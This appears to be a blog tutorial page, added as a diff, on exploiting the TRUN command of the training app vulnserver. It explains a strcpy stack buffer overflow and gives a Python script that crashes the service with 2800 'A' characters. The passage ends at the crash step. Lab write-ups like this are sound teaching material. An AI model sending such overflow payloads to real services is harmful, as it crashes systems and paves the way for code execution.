@@ -1,0 +1,1348 @@
+
+
+<!DOCTYPE html>
+<html
+  lang="en"
+  dir="ltr"
+  class="scroll-smooth"
+  data-default-appearance="dark"
+  data-auto-appearance="true"
+><head>
+  <meta charset="utf-8" />
+  
+  <meta http-equiv="content-language" content="en" />
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <meta http-equiv="X-UA-Compatible" content="ie=edge" />
+  
+  <title>Exploiting vulnserver: trun &middot; phish</title>
+  <meta name="title" content="Exploiting vulnserver: trun &middot; phish" />
+  
+  <meta name="description" content="Personal blog site" />
+  
+  
+  
+  <link rel="canonical" href="https://dunderhay.github.io/posts/vulnserver/trun/" />
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  <link type="text/css" rel="stylesheet" href="https://dunderhay.github.io/css/main.bundle.min.9c79820c0de59bb78e079b739edd300ac0cfc325324d07b76b90d2514c8f1f3cb8cbe855320a1d86a2723ee43eef0062ffba42d9de5c4e83ffdb27477e2b495e.css"
+    integrity="sha512-nHmCDA3lm7eOB5tznt0wCsDPwyUyTQe3a5DSUUyPHzy4y&#43;hVMgodhqJyPuQ&#43;7wBi/7pC2d5cToP/2ydHfitJXg==" />
+  
+  
+  <script type="text/javascript" src="https://dunderhay.github.io/js/main.min.cf83e1357eefb8bdf1542850d66d8007d620e4050b5715dc83f4a921d36ce9ce47d0d13c5d85f2b0ff8318d2877eec2f63b931bd47417a81a538327af927da3e.js" integrity="sha512-z4PhNX7vuL3xVChQ1m2AB9Yg5AULVxXcg/SpIdNs6c5H0NE8XYXysP&#43;DGNKHfuwvY7kxvUdBeoGlODJ6&#43;SfaPg=="></script>
+  
+  
+  <script type="text/javascript" src="https://dunderhay.github.io/js/appearance.min.f94f4c4636d9e3ec8f5ee53cdc8ffa3d01bf87cd92ac85e6797550b1e2b80dc9118d838f3eb24c55109352455e72ff082dfe560283154e5a8f87fd75107b59c4.js"
+    integrity="sha512-&#43;U9MRjbZ4&#43;yPXuU83I/6PQG/h82SrIXmeXVQseK4DckRjYOPPrJMVRCTUkVecv8ILf5WAoMVTlqPh/11EHtZxA=="></script>
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  <script defer type="text/javascript" id="script-bundle" src="https://dunderhay.github.io/js/main.bundle.min.3ddcf04f5b0d4c32f72e726d3c12eebccd8c3c9f9daa9a13414808895de0ae1e1cdddda6849680d5bd96dbb60d0b1e0b24c29f5c83e5631e55e7e6bc02015490.js"
+    integrity="sha512-PdzwT1sNTDL3LnJtPBLuvM2MPJ&#43;dqpoTQUgIiV3grh4c3d2mhJaA1b2W27YNCx4LJMKfXIPlYx5V5&#43;a8AgFUkA==" data-copy="" data-copied=""></script>
+  
+  <script src="https://dunderhay.github.io/js/zoom.min.js"></script>
+  
+  
+  <link rel="apple-touch-icon" sizes="180x180" href="https://dunderhay.github.io/apple-touch-icon.png" />
+  <link rel="icon" type="image/png" sizes="32x32" href="https://dunderhay.github.io/favicon-32x32.png" />
+  <link rel="icon" type="image/png" sizes="16x16" href="https://dunderhay.github.io/favicon-16x16.png" />
+  <link rel="manifest" href="https://dunderhay.github.io/site.webmanifest" />
+  
+  
+  
+  
+  
+  
+  
+  <meta property="og:title" content="Exploiting vulnserver: trun" />
+<meta property="og:description" content="Vanilla Stack Overflow" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://dunderhay.github.io/posts/vulnserver/trun/" /><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2019-01-30T00:00:00+00:00" />
+<meta property="article:modified_time" content="2019-01-30T00:00:00+00:00" /><meta property="og:site_name" content="phish" />
+
+
+  <meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="Exploiting vulnserver: trun"/>
+<meta name="twitter:description" content="Vanilla Stack Overflow"/>
+
+  
+  <script type="application/ld+json">
+  [{
+    "@context": "https://schema.org",
+    "@type": "Article",
+    "articleSection": "Posts",
+    "name": "Exploiting vulnserver: trun",
+    "headline": "Exploiting vulnserver: trun",
+    "description": "Vanilla Stack Overflow",
+    "abstract": "Vanilla Stack Overflow",
+    "inLanguage": "en",
+    "url" : "https:\/\/dunderhay.github.io\/posts\/vulnserver\/trun\/",
+    "author" : {
+      "@type": "Person",
+      "name": "Daniel Underhay"
+    },
+    "copyrightYear": "2019",
+    "dateCreated": "2019-01-30T00:00:00\u002b00:00",
+    "datePublished": "2019-01-30T00:00:00\u002b00:00",
+    
+    "dateModified": "2019-01-30T00:00:00\u002b00:00",
+    
+    "keywords": ["vulnserver","buffer overflow","exploit dev"],
+    
+    "mainEntityOfPage": "true",
+    "wordCount": "1506"
+  }]
+  </script>
+
+
+  
+  
+  <meta name="author" content="Daniel Underhay" />
+  
+  
+  
+  <link href="https://github.com/dunderhay/" rel="me" />
+  
+  
+  <link href="https://au.linkedin.com/in/daniel-underhay" rel="me" />
+  
+  
+  <link href="https://twitter.com/dunderhay" rel="me" />
+  
+  
+  
+  
+
+
+
+
+
+
+  
+  
+  
+  
+
+
+  
+  
+  
+  
+  
+</head><body
+    class="flex flex-col h-screen px-6 m-auto text-lg leading-7 max-w-7xl bg-neutral text-neutral-900 dark:bg-neutral-800 dark:text-neutral sm:px-14 md:px-24 lg:px-32"
+  >
+    <div id="the-top" class="absolute flex self-center">
+      <a
+        class="px-3 py-1 text-sm -translate-y-8 rounded-b-lg bg-primary-200 focus:translate-y-0 dark:bg-neutral-600"
+        href="#main-content"
+        ><span class="font-bold text-primary-600 ltr:pr-2 rtl:pl-2 dark:text-primary-400"
+          >&darr;</span
+        >Skip to main content</a
+      >
+    </div>
+    
+    
+      <div style="padding-left:0;padding-right:0"
+    class="flex items-center justify-between px-4 py-6 sm:px-6 md:justify-start space-x-3">
+    
+    <div class="flex flex-1 items-center justify-between">
+        <nav class="flex space-x-3">
+
+            <a href="https://dunderhay.github.io/" class="text-base font-medium text-gray-500 hover:text-gray-900">phish</a>
+            
+            
+        </nav>
+        <div class="hidden md:flex items-center space-x-5 md:ml-12">
+
+            
+            
+            <a href="https://dunderhay.github.io/posts/" class="text-base font-medium text-gray-500 hover:text-gray-900" title="Posts">
+                
+
+
+                
+                Blog
+            </a>
+            
+            <a href="https://github.com/dunderhay/" class="text-base font-medium text-gray-500 hover:text-gray-900" title="">
+                
+
+
+                
+                Github
+            </a>
+            
+            
+
+            
+
+
+            
+            <button id="search-button" class="text-base hover:text-primary-600 dark:hover:text-primary-400"
+                title="">
+                
+
+  <span class="relative inline-block align-text-bottom icon">
+    <svg aria-hidden="true" focusable="false" data-prefix="fas" data-icon="search" class="svg-inline--fa fa-search fa-w-16" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M505 442.7L405.3 343c-4.5-4.5-10.6-7-17-7H372c27.6-35.3 44-79.7 44-128C416 93.1 322.9 0 208 0S0 93.1 0 208s93.1 208 208 208c48.3 0 92.7-16.4 128-44v16.3c0 6.4 2.5 12.5 7 17l99.7 99.7c9.4 9.4 24.6 9.4 33.9 0l28.3-28.3c9.4-9.4 9.4-24.6.1-34zM208 336c-70.7 0-128-57.2-128-128 0-70.7 57.2-128 128-128 70.7 0 128 57.2 128 128 0 70.7-57.2 128-128 128z"/></svg>
+
+  </span>
+
+
+            </button>
+            
+
+            
+            
+            
+            <div
+                class="ltr:mr-14 rtl:ml-14 cursor-pointer text-sm text-neutral-700 hover:text-primary-600 dark:text-neutral dark:hover:text-primary-400">
+                <button id="appearance-switcher" type="button">
+                    <div class="flex items-center justify-center h-12 dark:hidden">
+                        
+
+  <span class="relative inline-block align-text-bottom icon">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M32 256c0-123.8 100.3-224 223.8-224c11.36 0 29.7 1.668 40.9 3.746c9.616 1.777 11.75 14.63 3.279 19.44C245 86.5 211.2 144.6 211.2 207.8c0 109.7 99.71 193 208.3 172.3c9.561-1.805 16.28 9.324 10.11 16.95C387.9 448.6 324.8 480 255.8 480C132.1 480 32 379.6 32 256z"/></svg>
+
+  </span>
+
+
+                    </div>
+                    <div class="items-center justify-center hidden h-12 dark:flex">
+                        
+
+  <span class="relative inline-block align-text-bottom icon">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M256 159.1c-53.02 0-95.1 42.98-95.1 95.1S202.1 351.1 256 351.1s95.1-42.98 95.1-95.1S309 159.1 256 159.1zM509.3 347L446.1 255.1l63.15-91.01c6.332-9.125 1.104-21.74-9.826-23.72l-109-19.7l-19.7-109c-1.975-10.93-14.59-16.16-23.72-9.824L256 65.89L164.1 2.736c-9.125-6.332-21.74-1.107-23.72 9.824L121.6 121.6L12.56 141.3C1.633 143.2-3.596 155.9 2.736 164.1L65.89 256l-63.15 91.01c-6.332 9.125-1.105 21.74 9.824 23.72l109 19.7l19.7 109c1.975 10.93 14.59 16.16 23.72 9.824L256 446.1l91.01 63.15c9.127 6.334 21.75 1.107 23.72-9.822l19.7-109l109-19.7C510.4 368.8 515.6 356.1 509.3 347zM256 383.1c-70.69 0-127.1-57.31-127.1-127.1c0-70.69 57.31-127.1 127.1-127.1s127.1 57.3 127.1 127.1C383.1 326.7 326.7 383.1 256 383.1z"/></svg>
+
+  </span>
+
+
+                    </div>
+                </button>
+            </div>
+            
+
+        </div>
+        <div class="flex md:hidden items-center space-x-5 md:ml-12">
+
+            <span></span>
+
+            
+
+
+            
+            <button id="search-button-mobile" class="text-base hover:text-primary-600 dark:hover:text-primary-400"
+                title="">
+                
+
+  <span class="relative inline-block align-text-bottom icon">
+    <svg aria-hidden="true" focusable="false" data-prefix="fas" data-icon="search" class="svg-inline--fa fa-search fa-w-16" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M505 442.7L405.3 343c-4.5-4.5-10.6-7-17-7H372c27.6-35.3 44-79.7 44-128C416 93.1 322.9 0 208 0S0 93.1 0 208s93.1 208 208 208c48.3 0 92.7-16.4 128-44v16.3c0 6.4 2.5 12.5 7 17l99.7 99.7c9.4 9.4 24.6 9.4 33.9 0l28.3-28.3c9.4-9.4 9.4-24.6.1-34zM208 336c-70.7 0-128-57.2-128-128 0-70.7 57.2-128 128-128 70.7 0 128 57.2 128 128 0 70.7-57.2 128-128 128z"/></svg>
+
+  </span>
+
+
+            </button>
+            
+
+            
+            
+            <button id="appearance-switcher-mobile" type="button" style="margin-right:5px">
+                <div class="flex items-center justify-center h-12 dark:hidden">
+                    
+
+  <span class="relative inline-block align-text-bottom icon">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M32 256c0-123.8 100.3-224 223.8-224c11.36 0 29.7 1.668 40.9 3.746c9.616 1.777 11.75 14.63 3.279 19.44C245 86.5 211.2 144.6 211.2 207.8c0 109.7 99.71 193 208.3 172.3c9.561-1.805 16.28 9.324 10.11 16.95C387.9 448.6 324.8 480 255.8 480C132.1 480 32 379.6 32 256z"/></svg>
+
+  </span>
+
+
+                </div>
+                <div class="items-center justify-center hidden h-12 dark:flex">
+                    
+
+  <span class="relative inline-block align-text-bottom icon">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M256 159.1c-53.02 0-95.1 42.98-95.1 95.1S202.1 351.1 256 351.1s95.1-42.98 95.1-95.1S309 159.1 256 159.1zM509.3 347L446.1 255.1l63.15-91.01c6.332-9.125 1.104-21.74-9.826-23.72l-109-19.7l-19.7-109c-1.975-10.93-14.59-16.16-23.72-9.824L256 65.89L164.1 2.736c-9.125-6.332-21.74-1.107-23.72 9.824L121.6 121.6L12.56 141.3C1.633 143.2-3.596 155.9 2.736 164.1L65.89 256l-63.15 91.01c-6.332 9.125-1.105 21.74 9.824 23.72l109 19.7l19.7 109c1.975 10.93 14.59 16.16 23.72 9.824L256 446.1l91.01 63.15c9.127 6.334 21.75 1.107 23.72-9.822l19.7-109l109-19.7C510.4 368.8 515.6 356.1 509.3 347zM256 383.1c-70.69 0-127.1-57.31-127.1-127.1c0-70.69 57.31-127.1 127.1-127.1s127.1 57.3 127.1 127.1C383.1 326.7 326.7 383.1 256 383.1z"/></svg>
+
+  </span>
+
+
+                </div>
+            </button>
+            
+
+        </div>
+    </div>
+    <div class="-my-2 -mr-2 md:hidden">
+
+        <label id="menu-button" for="menu-controller" class="block">
+            <input type="checkbox" id="menu-controller" class="hidden" />
+            <div class="cursor-pointer hover:text-primary-600 dark:hover:text-primary-400">
+                
+
+  <span class="relative inline-block align-text-bottom icon">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><path fill="currentColor" d="M0 96C0 78.33 14.33 64 32 64H416C433.7 64 448 78.33 448 96C448 113.7 433.7 128 416 128H32C14.33 128 0 113.7 0 96zM0 256C0 238.3 14.33 224 32 224H416C433.7 224 448 238.3 448 256C448 273.7 433.7 288 416 288H32C14.33 288 0 273.7 0 256zM416 448H32C14.33 448 0 433.7 0 416C0 398.3 14.33 384 32 384H416C433.7 384 448 398.3 448 416C448 433.7 433.7 448 416 448z"/></svg>
+
+  </span>
+
+
+            </div>
+            <div id="menu-wrapper" style="padding-top:25px;"
+                class="fixed inset-0 z-30 invisible w-screen h-screen m-auto overflow-auto transition-opacity opacity-0 cursor-default bg-neutral-100/50 backdrop-blur-sm dark:bg-neutral-900/50">
+                <ul
+                    class="flex movedown flex-col w-full px-6 py-6 mx-auto overflow-visible list-none ltr:text-right rtl:text-left max-w-7xl sm:px-14 md:px-24 lg:px-32 sm:py-10 sm:pt-10">
+                    <li class="mb-1">
+                        <span class="cursor-pointer hover:text-primary-600 dark:hover:text-primary-400">
+
+  <span class="relative inline-block align-text-bottom icon">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 320 512"><path fill="currentColor" d="M310.6 361.4c12.5 12.5 12.5 32.75 0 45.25C304.4 412.9 296.2 416 288 416s-16.38-3.125-22.62-9.375L160 301.3L54.63 406.6C48.38 412.9 40.19 416 32 416S15.63 412.9 9.375 406.6c-12.5-12.5-12.5-32.75 0-45.25l105.4-105.4L9.375 150.6c-12.5-12.5-12.5-32.75 0-45.25s32.75-12.5 45.25 0L160 210.8l105.4-105.4c12.5-12.5 32.75-12.5 45.25 0s12.5 32.75 0 45.25l-105.4 105.4L310.6 361.4z"/></svg>
+
+  </span>
+
+</span>
+                    </li>
+
+                    
+                    
+                    <li class="mb-1">
+                        <a class="decoration-primary-500 hover:underline hover:decoration-2 hover:underline-offset-2"
+                            href="https://dunderhay.github.io/posts/" title="Posts">
+                            
+
+
+                            
+                            Blog
+                        </a>
+                    </li>
+                    
+                    <li class="mb-1">
+                        <a class="decoration-primary-500 hover:underline hover:decoration-2 hover:underline-offset-2"
+                            href="https://github.com/dunderhay/" title="">
+                            
+
+
+                            
+                            Github
+                        </a>
+                    </li>
+                    
+                    
+
+                </ul>
+            </div>
+        </label>
+    </div>
+</div>
+
+
+<div id="mobile-menu"
+    class="fixed inset-0 z-30 invisible w-screen h-screen m-auto overflow-auto transition-opacity opacity-0 cursor-default bg-neutral-100/50 backdrop-blur-sm dark:bg-neutral-900/50">
+    <ul
+        class="flex movedown flex-col w-full px-6 py-6 mx-auto overflow-visible list-none ltr:text-right rtl:text-left max-w-7xl sm:px-14 md:px-24 lg:px-32 sm:py-10 sm:pt-10">
+        <li class="mb-1">
+            <span class="cursor-pointer hover:text-primary-600 dark:hover:text-primary-400">
+
+  <span class="relative inline-block align-text-bottom icon">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 320 512"><path fill="currentColor" d="M310.6 361.4c12.5 12.5 12.5 32.75 0 45.25C304.4 412.9 296.2 416 288 416s-16.38-3.125-22.62-9.375L160 301.3L54.63 406.6C48.38 412.9 40.19 416 32 416S15.63 412.9 9.375 406.6c-12.5-12.5-12.5-32.75 0-45.25l105.4-105.4L9.375 150.6c-12.5-12.5-12.5-32.75 0-45.25s32.75-12.5 45.25 0L160 210.8l105.4-105.4c12.5-12.5 32.75-12.5 45.25 0s12.5 32.75 0 45.25l-105.4 105.4L310.6 361.4z"/></svg>
+
+  </span>
+
+</span>
+        </li>
+        
+        
+        <li class="mb-1">
+            <a class="decoration-primary-500 hover:underline hover:decoration-2 hover:underline-offset-2"
+                href="https://dunderhay.github.io/posts/" title="Posts">Blog</a>
+        </li>
+        
+        <li class="mb-1">
+            <a class="decoration-primary-500 hover:underline hover:decoration-2 hover:underline-offset-2"
+                href="https://github.com/dunderhay/" title="">Github</a>
+        </li>
+        
+        
+        
+        <li>
+            <button id="search-button-mobile" class="text-base hover:text-primary-600 dark:hover:text-primary-400">
+                
+
+  <span class="relative inline-block align-text-bottom icon">
+    <svg aria-hidden="true" focusable="false" data-prefix="fas" data-icon="search" class="svg-inline--fa fa-search fa-w-16" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M505 442.7L405.3 343c-4.5-4.5-10.6-7-17-7H372c27.6-35.3 44-79.7 44-128C416 93.1 322.9 0 208 0S0 93.1 0 208s93.1 208 208 208c48.3 0 92.7-16.4 128-44v16.3c0 6.4 2.5 12.5 7 17l99.7 99.7c9.4 9.4 24.6 9.4 33.9 0l28.3-28.3c9.4-9.4 9.4-24.6.1-34zM208 336c-70.7 0-128-57.2-128-128 0-70.7 57.2-128 128-128 70.7 0 128 57.2 128 128 0 70.7-57.2 128-128 128z"/></svg>
+
+  </span>
+
+
+            </button>
+        </li>
+        
+    </ul>
+</div>
+    
+    <div class="relative flex flex-col grow">
+      <main id="main-content" class="grow">
+        
+<article>
+  
+  
+    
+      
+    <header id="single_header" class="mt-5 max-w-prose">
+    
+    <ol class="text-sm text-neutral-500 dark:text-neutral-400 print:hidden">
+  
+  
+    
+  
+    
+  
+  <li class="inline hidden">
+    <a
+      class="hover:underline decoration-neutral-300 dark:underline-neutral-600"
+      href="https://dunderhay.github.io/"
+      >phish</a
+    ><span class="px-1 text-primary-500">/</span>
+  </li>
+
+  
+  <li class="inline ">
+    <a
+      class="hover:underline decoration-neutral-300 dark:underline-neutral-600"
+      href="https://dunderhay.github.io/posts/"
+      >Posts</a
+    ><span class="px-1 text-primary-500">/</span>
+  </li>
+
+  
+  <li class="inline hidden">
+    <a
+      class="hover:underline decoration-neutral-300 dark:underline-neutral-600"
+      href="https://dunderhay.github.io/posts/vulnserver/trun/"
+      >Exploiting vulnserver: trun</a
+    ><span class="px-1 text-primary-500">/</span>
+  </li>
+
+</ol>
+
+
+    
+    <h1 class="mt-0 text-4xl font-extrabold text-neutral-900 dark:text-neutral">
+      Exploiting vulnserver: trun
+    </h1>
+    <div class="mt-1 mb-6 text-base text-neutral-500 dark:text-neutral-400 print:hidden">
+      
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<div class="flex flex-row flex-wrap items-center">
+  
+  
+
+  
+  
+</div>
+
+
+
+
+<div class="flex flex-row flex-wrap items-center">
+  
+  
+  
+  
+  
+  
+  <span style="margin-top:0.5rem" class="mr-2" onclick="window.open(&#34;/tags/vulnserver/&#34;);">
+    <span class="flex">
+  <span
+    class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400"
+  >
+    vulnserver
+  </span>
+</span>
+
+  </span>
+  
+  <span style="margin-top:0.5rem" class="mr-2" onclick="window.open(&#34;/tags/buffer-overflow/&#34;);">
+    <span class="flex">
+  <span
+    class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400"
+  >
+    buffer overflow
+  </span>
+</span>
+
+  </span>
+  
+  <span style="margin-top:0.5rem" class="mr-2" onclick="window.open(&#34;/tags/exploit-dev/&#34;);">
+    <span class="flex">
+  <span
+    class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400"
+  >
+    exploit dev
+  </span>
+</span>
+
+  </span>
+  
+  
+  
+  
+</div>
+
+
+
+
+<div class="flex flex-row flex-wrap items-center">
+  
+  
+  
+  
+  
+  
+  
+</div>
+
+
+
+    </div>
+  </header>
+  <section class="flex flex-col max-w-full mt-0 prose dark:prose-invert lg:flex-row">
+     <div class="order-first px-0 lg:order-last lg:max-w-xs ltr:lg:pl-8 rtl:lg:pr-8">
+      <div class="toc ltr:pl-5 rtl:pr-5 print:hidden lg:sticky lg:top-10">
+        <details open class="mt-0 overflow-hidden rounded-lg ltr:-ml-5 ltr:pl-5 rtl:-mr-5 rtl:pr-5 hidden lg:block">
+  <summary
+    class="block py-1 text-lg font-semibold cursor-pointer bg-neutral-100 text-neutral-800 ltr:-ml-5 ltr:pl-5 rtl:-mr-5 rtl:pr-5 dark:bg-neutral-700 dark:text-neutral-100 lg:hidden"
+  >
+    Table of Contents
+  </summary>
+  <div
+    class="min-w-[220px] py-2 border-dotted border-neutral-300 ltr:-ml-5 ltr:border-l ltr:pl-5 rtl:-mr-5 rtl:border-r rtl:pr-5 dark:border-neutral-600"
+  >
+    <nav id="TableOfContents">
+  <ul>
+    <li><a href="#the-code">The Code</a></li>
+    <li><a href="#exploitation">Exploitation</a></li>
+    <li><a href="#control-execution-flow">Control execution flow</a>
+      <ul>
+        <li><a href="#jmp--call-esp">JMP || CALL ESP</a></li>
+      </ul>
+    </li>
+    <li><a href="#bad-characters">Bad Characters</a></li>
+    <li><a href="#shellcode">Shellcode</a></li>
+  </ul>
+</nav>
+  </div>
+</details>
+<details class="mt-0 overflow-hidden rounded-lg ltr:-ml-5 ltr:pl-5 rtl:-mr-5 rtl:pr-5 lg:hidden">
+  <summary
+    class="py-1 text-lg font-semibold cursor-pointer bg-neutral-100 text-neutral-800 ltr:-ml-5 ltr:pl-5 rtl:-mr-5 rtl:pr-5 dark:bg-neutral-700 dark:text-neutral-100 lg:hidden"
+  >
+    Table of Contents
+  </summary>
+  <div
+    class="py-2 border-dotted border-neutral-300 ltr:-ml-5 ltr:border-l ltr:pl-5 rtl:-mr-5 rtl:border-r rtl:pr-5 dark:border-neutral-600"
+  >
+    <nav id="TableOfContents">
+  <ul>
+    <li><a href="#the-code">The Code</a></li>
+    <li><a href="#exploitation">Exploitation</a></li>
+    <li><a href="#control-execution-flow">Control execution flow</a>
+      <ul>
+        <li><a href="#jmp--call-esp">JMP || CALL ESP</a></li>
+      </ul>
+    </li>
+    <li><a href="#bad-characters">Bad Characters</a></li>
+    <li><a href="#shellcode">Shellcode</a></li>
+  </ul>
+</nav>
+  </div>
+</details>
+
+      </div>
+      </div>
+      
+      <div class="min-w-0 min-h-0 max-w-prose">
+        <p>Since we have the source code, lets have a quick look at the vulnerable code for the <strong>TRUN</strong> command.</p>
+<h2 id="the-code" class="relative group">The Code <span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#the-code" aria-label="Anchor">#</a></span></h2>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-csharp" data-lang="csharp"><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="n">strncmp</span><span class="p">(</span><span class="n">RecvBuf</span><span class="p">,</span> <span class="s">&#34;TRUN &#34;</span><span class="p">,</span> <span class="m">5</span><span class="p">)</span> <span class="p">==</span> <span class="m">0</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="kt">char</span> <span class="p">*</span><span class="n">TrunBuf</span> <span class="p">=</span> <span class="n">malloc</span><span class="p">(</span><span class="m">3000</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="n">memset</span><span class="p">(</span><span class="n">TrunBuf</span><span class="p">,</span> <span class="m">0</span><span class="p">,</span> <span class="m">3000</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="k">for</span> <span class="p">(</span><span class="n">i</span> <span class="p">=</span> <span class="m">5</span><span class="p">;</span> <span class="n">i</span> <span class="p">&lt;</span> <span class="n">RecvBufLen</span><span class="p">;</span> <span class="n">i</span><span class="p">++)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">      <span class="k">if</span> <span class="p">((</span><span class="kt">char</span><span class="p">)</span><span class="n">RecvBuf</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="p">==</span> <span class="sc">&#39;.&#39;</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">          <span class="n">strncpy</span><span class="p">(</span><span class="n">TrunBuf</span><span class="p">,</span> <span class="n">RecvBuf</span><span class="p">,</span> <span class="m">3000</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">          <span class="n">Function3</span><span class="p">(</span><span class="n">TrunBuf</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">          <span class="k">break</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">      <span class="p">}</span>
+</span></span><span class="line"><span class="cl">  <span class="p">}</span>
+</span></span><span class="line"><span class="cl">  <span class="n">memset</span><span class="p">(</span><span class="n">TrunBuf</span><span class="p">,</span> <span class="m">0</span><span class="p">,</span> <span class="m">3000</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="n">SendResult</span> <span class="p">=</span> <span class="n">send</span><span class="p">(</span> <span class="n">Client</span><span class="p">,</span> <span class="s">&#34;TRUN COMPLETE\n&#34;</span><span class="p">,</span> <span class="m">14</span><span class="p">,</span> <span class="m">0</span> <span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="p">...</span>
+</span></span><span class="line"><span class="cl"><span class="k">void</span> <span class="n">Function3</span><span class="p">(</span><span class="kt">char</span> <span class="p">*</span><span class="n">Input</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">char</span> <span class="n">Buffer2S</span><span class="p">[</span><span class="m">2000</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">    <span class="n">strcpy</span><span class="p">(</span><span class="n">Buffer2S</span><span class="p">,</span> <span class="n">Input</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="p">}</span>
+</span></span></code></pre></div><p>The code inside <code>Function3</code> takes our user supplied string and copies it to a local stack variable <code>Buffer2S</code>.</p>
+<p><code>char *strcpy(char *dest, const char *src)</code></p>
+<p>The unsafe C library function <code>strcpy</code> does not check the size of the destination array.</p>
+<p>The vulnerable line: <code>strcpy(Buffer2S, Input)</code>, simply copies the memory contents of <code>Input</code> into <code>Buffer2S</code> until a <strong>“00”</strong> (null-byte or null terminator) is encountered, without checking the size of area allocated to <code>Buffer2S</code>.</p>
+<p>The command will execute fine if we run the <code>TRUN</code> command on a string smaller than 2000 characters:</p>
+<img src="https://dunderhay.github.io/images/vulnserver/trun/Stack-Overflow-trun1.png" alt="trun-stack-normal" width="400"/>
+<p>However, If we supply the <code>TRUN</code> command with an argument <strong>larger than 2000</strong> characters long it will corrupt the stack, as shown below:</p>
+<img src="https://dunderhay.github.io/images/vulnserver/trun/Stack-Overflow-trun2.png" alt="trun-stack-overflow" width="400"/>
+<h2 id="exploitation" class="relative group">Exploitation <span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#exploitation" aria-label="Anchor">#</a></span></h2>
+<p>So to trigger the buffer overflow, update the python script to send  <strong>2800</strong> &ldquo;A&rdquo; characters after the <code>TRUN</code> command:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="ch">#!/usr/bin/env python</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">socket</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">sys</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">buffer</span> <span class="o">=</span> <span class="s1">&#39;A&#39;</span> <span class="o">*</span> <span class="mi">2800</span>
+</span></span><span class="line"><span class="cl"><span class="n">command</span> <span class="o">=</span> <span class="s1">&#39;TRUN .&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="n">data</span> <span class="o">=</span> <span class="n">command</span> <span class="o">+</span> <span class="n">buffer</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nb">print</span> <span class="s1">&#39;[*] Sending data: &#39;</span> <span class="o">+</span> <span class="n">data</span>
+</span></span><span class="line"><span class="cl"><span class="n">s</span> <span class="o">=</span> <span class="n">socket</span><span class="o">.</span><span class="n">create_connection</span><span class="p">((</span><span class="s1">&#39;192.168.185.146&#39;</span><span class="p">,</span><span class="mi">9999</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl"><span class="n">s</span><span class="o">.</span><span class="n">sendall</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">s</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
+</span></span></code></pre></div><p>When the applications sees the string <strong>“TRUN ”</strong> it checks if the <strong>5th</strong> character is a <code>.</code></p>
+<p>So to run the TRUN command successfully, you need to send <code>TRUN .</code> (space followed by dot, followed by the large buffer).</p>
+<p>Sending the large buffer of A&rsquo;s:</p>
+<img src="https://dunderhay.github.io/images/vulnserver/trun/trun-send-crash1.png" alt="trun-send-crash1" width="700"/>
+<p>On the Windows 7 machine, in Immunity debugger, we should now be able to see the vulnserver application has crashed as follows:</p>
